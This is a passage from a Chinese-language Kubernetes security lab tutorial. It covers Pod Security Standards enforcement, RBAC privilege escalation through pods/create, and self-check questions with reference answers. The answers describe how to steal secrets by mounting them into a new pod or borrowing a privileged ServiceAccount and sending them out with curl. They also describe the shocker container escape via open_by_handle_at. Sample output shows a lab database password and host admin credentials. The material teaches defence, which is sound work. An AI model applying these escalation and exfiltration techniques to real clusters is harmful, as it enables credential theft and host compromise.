測試完攻擊威力後，把惡意 Pod 刪掉，然後在 `nexuspay-prod` Namespace 貼上 `restricted` 強制標籤：

```bash
kubectl delete pod evil-escalate-pod -n nexuspay-prod
kubectl label namespace nexuspay-prod \
  pod-security.kubernetes.io/enforce=restricted \
  pod-security.kubernetes.io/enforce-version=latest --overwrite
```

這時再重新跑一次步驟 2 建立 `evil-escalate-pod` 的 `curl` 指令，看看 API Server 怎麼擋。最後別忘了把 `worker-sa` 加上 `automountServiceAccountToken: false`、刪掉 `rb-worker-pod-mgr` RoleBinding 並重啟 `nexuspay-worker`。收工時執行 `kind delete cluster --name nexuspay-lab` 就能把本地測試叢集清得乾乾淨淨。

### 外部靶場對照檢查點

想挑戰更多真實叢集提權路線，推薦搭配本地免費開源的 **Kubernetes Goat**（https://madhuakula.com/kubernetes-goat/ ）練手。你可以重點挑裡面的 **Docker-in-Docker / Socket 逃逸** 與 **RBAC 權限濫用** 關卡，體驗怎麼在沒有提示的環境裡，靠著 `/proc/self/status` 解碼 `CapEff` 位元遮罩、一步步摸出節點與控制平面的破口。

---

### 參考解答

#### 1. 為什麼沒有 `secrets/get` 卻能偷到資料庫密碼與宿主機檔案？

在步驟 2 第 1 小步，直接打 `/api/v1/namespaces/nexuspay-prod/secrets/nexuspay-db-secret` 時，API Server 確實回傳了 `403 Forbidden`，因為 `worker-pod-launcher` 這個 Role 只有 `pods` 的 `get`、`list`、`create` 權限。

但到了第 2 小步，我們利用 `pods/create` 送出 `evil-escalate-pod` 時，Kubernetes 預設並不會去檢查「建立 Pod 的人自己有沒有權限讀那個 Secret」。只要被掛載的 `nexuspay-db-secret` 跟 Pod 在同一個 Namespace，kubelet 啟動容器時就會乖乖把密鑰注入環境變數 `DB_DSN`；同時因為 Namespace 沒擋 `privileged: true` 與 `hostPath: /`，跑完 `kubectl logs -n nexuspay-prod evil-escalate-pod` 就會直接看到：

```text
DB=postgres://nexuspay:S3cr3tPassw0rd!@10.0.1.50:5432/ledger
admin.conf
controller-manager.conf
kubelet.conf
manifests
pki
scheduler.conf
```

原本被 RBAC 擋住的帳本資料庫連線字串，還有宿主節點 `/etc/kubernetes` 底下的叢集管理員憑證 `admin.conf`，就這樣一併到手了。

#### 2. 套用 PSS Restricted 後的准入攔截結果

在步驟 3 貼上 `pod-security.kubernetes.io/enforce=restricted` 標籤後，再次從 `nexuspay-worker` 發送建立 `evil-escalate-pod` 的請求，API Server 連排程都不會進，當場就會在准入階段回傳 `403 Forbidden` 並列出所有違規項目：

```text
pods "evil-escalate-pod" is forbidden: violates PodSecurity "restricted:latest":
privileged (container "pwn" must not set securityContext.privileged=true),
hostPath volumes (volume "host-root"),
allowPrivilegeEscalation != false (...),
unrestricted capabilities (...),
runAsNonRoot != true (...),
seccompProfile (...)
```

最後配合拔掉 `rb-worker-pod-mgr` 的 `pods/create` 權限，並在 ServiceAccount 與 Pod 雙層設好 `automountServiceAccountToken: false` 重建 Pod，容器裡連 `/var/run/secrets/kubernetes.io/serviceaccount/token` 檔案都不再出現，徹底封死這條提權鏈。

---

## 自我檢核

- **難度**：進階
- **預估時間**：20 分鐘

先別往回翻，試著用剛學到的核心原語與 RBAC 規則，回答下面 4 個實戰審查問題：

1. **只砍 Capabilities 夠不夠**：某個團隊已經在容器的 `securityContext` 裡設了 `runAsNonRoot: true` 和 `capabilities.drop: ["ALL"]`，於是覺得再設定 `seccompProfile: RuntimeDefault` 是多此一舉。請從 Linux 核心系統呼叫的運作機制，說明為什麼沒開 seccomp 還是會留下一大片核心攻擊面？
2. **PSS Restricted 擋不住的借殼偷權杖**：假設某個名稱空間已經開了 Pod Security Standards `restricted` 模式（徹底封殺了 `privileged` 跟 `hostPath`），裡面有個高權限的 `payment-reconciler-sa` 負責每天讀取帳務密鑰，而攻擊者打穿了一個只有 `pods/create` 權限（沒有 `secrets/get`）的低權限 Pod。請問在不出這個 Namespace 的前提下，攻擊者要怎麼設計新 Pod 的 YAML 欄位，合法借用 `payment-reconciler-sa` 的權限把密鑰搬走？
3. **解碼 `/proc/self/status` 的逃逸線索**：你在做滲透測試時拿到一個容器的 Shell，執行 `grep CapEff /proc/self/status` 看到 `CapEff: 0000000000000004`（Bit 2 為 `1`，代表擁有 `CAP_DAC_READ_SEARCH`），而且發現 `seccomp` 狀態是 `0`（`Unconfined`）。請問這時候你可以呼叫哪一個 Linux 系統呼叫來繞過 Mount Namespace 偷讀宿主機檔案？如果管理員把 seccomp 改成 `RuntimeDefault`，為什麼這招就失效了？
4. **短效 Token 的暴露風險**：Kubernetes 1.22 之後早就把預設掛載的憑證換成有時效性（例如 `3600 s`）且綁定 Pod 的 Bound ServiceAccount Token 了。既然 Token 會過期，為什麼資安規範還是強制要求：只要是不需要打 K8s API 的服務，一律得加上 `automountServiceAccountToken: false`？

---

### 參考解答

1. **只砍 Capabilities 夠不夠**：
   - `capabilities.drop: ["ALL"]` 只是拔掉行程手上的特權位元，讓核心在走到「需要檢查特定 Capability 的程式碼分支」時拒絕執行；但 Linux 核心超過 300 個系統呼叫的大門依然對這個行程敞開，而且裡面有非常多根本不需要任何特權 Capability 就能進入的系統呼叫路徑（像是特定條件下的 `io_uring_setup`、`userfaultfd`，或是各種網路 `socket` / `ioctl` 處理分支）。
   - 歷年來許多嚴重的 Linux 核心記憶體提權漏洞，偏偏就是在這些非特權系統呼叫裡爆出來的。加上 `seccompProfile: RuntimeDefault`，才能在系統呼叫剛跨進核心入口時，就先用 BPF 過濾器把應用程式根本用不到的幾十個高風險系統呼叫直接攔下來，大幅縮小核心被打穿的機會。
2. **PSS Restricted 擋不住的借殼偷權杖**：
   - **完全可以借殼偷走。** 因為 PSS `restricted` 管的是「不能開特權容器、不能掛宿主路徑、必須用非 root 跑」，它並不會禁止一個合規的普通 Pod 去指定同一個 Namespace 裡既有的 `spec.serviceAccountName`，也不會禁止直接用 `envFrom.secretRef` 或 `volumes.secret` 掛載同 Namespace 的 `Secret`。
   - 攻擊者只要照著 `restricted` 的規矩（設好 `runAsNonRoot: true`、`allowPrivilegeEscalation: false`、`capabilities.drop: ["ALL"]`、`seccompProfile: RuntimeDefault`），用 `pods/create` 開一個完全合規的普通 Pod，並在 `spec.serviceAccountName` 填上 `payment-reconciler-sa`（只要該 SA 沒關閉 Token 自動投射），或者直接把目標 `Secret` 掛進環境變數，再讓容器啟動指令用 `curl` 把憑證或密鑰外傳到自己的伺服器（若有 `pods/log` 權限甚至直接看 log），就能順利得手。所以除了開 PSS `restricted`，還必須砍掉不該給的 `pods/create`，或用 ValidatingAdmissionPolicy 限制誰能綁定高權限 SA 與敏感 Secret。
3. **解碼 `/proc/self/status` 的逃逸線索**：
   - 靠的是 **`open_by_handle_at(2)`** 系統呼叫。這個系統呼叫允許擁有 `CAP_DAC_READ_SEARCH` 的行程直接傳入底層檔案系統的 inode handle（例如從現有掛載點與 `EXT4` 根目錄固定為 inode `2` 的結構去推算或暴力猜測），根本不用走 Mount Namespace 的路徑解析樹就能直接把宿主機上的檔案打開（也就是經典的 `shocker` 逃逸）。
   - 一旦管理員把容器的 seccomp 設成 `RuntimeDefault`，Docker 與 containerd 的預設白名單本來就把 `open_by_handle_at` 列在封鎖清單裡（呼叫時直接回傳 `EPERM`）；系統呼叫在第一關就被 BPF 濾網擋掉了，根本走不到後面檢查 `CAP_DAC_READ_SEARCH` 的核心程式碼。
4. **短效 Token 的暴露風險**：
   - 雖然 Bound Token 預設有諸如 `3600 s` 的效期，但只要那個 Pod 還活著，節點上的 `kubelet` 就會在背景自動幫它續簽並更新 `/var/run/secrets/kubernetes.io/serviceaccount/token` 檔案內容。
   - 這代表當容器裡的後端服務出現 RCE，甚至只是一個任意檔案讀取／路徑遍歷漏洞（直接去讀那個固定路徑的 token 檔）時，攻擊者拿到的永遠是一張「當下新鮮有效」的 JWT，馬上就能拿去打 API Server 探測權限。對根本不需要跟 K8s API 溝通的業務容器，直接設 `automountServiceAccountToken: false` 讓那個檔案從一開始就不存在，才是釜底抽薪的辦法。

---

## 延伸閱讀

- **Linux Programmer's Manual — `namespaces(7)`、`capabilities(7)` 與 `seccomp(2)`**（https://man7.org/linux/man-pages/man7/namespaces.7.html 、https://man7.org/linux/man-pages/man7/capabilities.7.html 、https://man7.org/linux/man-pages/man2/seccomp.2.html ）：查閱核心隔離原語、41 個 Capability 位元定義與 BPF 系統呼叫過濾器的第一手規格。
- **Kubernetes 官方文件 — Pod Security Standards & RBAC Good Practices**（https://kubernetes.io/docs/concepts/security/pod-security-standards/ 、https://kubernetes.io/docs/concepts/security/rbac-good-practices/ ）：對照 `baseline` 與 `restricted` 兩個安全等級的具體 YAML 欄位要求，以及官方推薦的 RBAC 最小權限設計原則。
- **Microsoft Security — Threat Matrix for Kubernetes**（https://microsoft.github.io/Threat-Matrix-for-Kubernetes/ ）：把 Kubernetes 從初始入侵、執行、權限提升到橫向移動的所有攻擊手法系統化攤開的實戰對照表。
- **NCC Group — Abusing Kubernetes RBAC and Pod Security**（https://research.nccgroup.com/ ）：搭配開源審計工具 `kubiscan` 與 `rbac-lookup` 的機制剖析，深入追蹤多跳 RBAC 權限圖與隱蔽提權動詞的真實案例。
